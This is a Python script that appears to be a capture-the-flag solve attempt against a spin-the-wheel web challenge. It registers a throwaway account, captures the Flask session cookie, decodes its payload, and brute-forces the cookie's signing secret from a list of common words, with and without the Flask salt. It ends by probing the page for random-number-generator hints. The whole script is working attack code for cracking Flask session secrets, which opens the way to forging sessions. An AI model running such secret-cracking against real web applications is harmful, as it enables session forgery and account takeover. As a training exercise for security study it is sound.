import requests, base64, zlib, json, string, random

base = 'https://web-random-cheese.tracebash.xyz'

# Get a session cookie after spinning
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

# Spin a few times
for _ in range(3):
    r = s.post(f'{base}/spin')
    print('Spin:', r.json())

cookie = s.cookies.get('session')
print('\nCookie:', cookie)

# Parse payload
parts = cookie.split('.')
payload_b64 = parts[1]
padded = payload_b64 + '=' * (4 - len(payload_b64) % 4) if len(payload_b64) % 4 else payload_b64
raw = base64.urlsafe_b64decode(padded)
try:
    data = zlib.decompress(raw)
    print('Decoded session:', json.loads(data))
except:
    print('Raw payload:', raw)

# Try to crack with flask-unsign approach using common words
common_secrets = ['secret', 'changeme', 'cheese', 'jerry', 'tom', 'tomandjerry', 
                  'draw', 'lucky', 'spin', 'wheel', 'ctf', 'flag', 'admin', 
                  'password', 'key', 'flask', '12345', '123456', 'qwerty',
                  's3cr3t', 'debug', 'dev', 'development', 'production']

from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, URLSafeSerializer
import hashlib, hmac

# Try to unsign the cookie
for secret in common_secrets:
    try:
        signer = URLSafeTimedSerializer(
            secret, 
            salt='cookie-session',
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
            },
            serializer=TaggedJSONSerializer()
        )
        data = signer.loads(cookie)
        print(f'\nSUCCESS! Secret: {repr(secret)}')
        print('Session data:', data)
        break
    except Exception as e:
        pass
else:
    # Try without salt
    for secret in common_secrets:
        try:
            signer = URLSafeTimedSerializer(
                secret,
                signer_kwargs={
                    'key_derivation': 'hmac',
                    'digest_method': hashlib.sha1
                },
                serializer=TaggedJSONSerializer()
            )
            data = signer.loads(cookie)
            print(f'\nSUCCESS (no salt)! Secret: {repr(secret)}')
            print('Session data:', data)
            break
        except:
            pass

# Also check the timestamp for seed
print('\nAttempting to derive PRNG...')
r = s.get(f'{base}/')
print('Page contains PRNG?', 'random' in r.text.lower(), 'seed' in r.text.lower())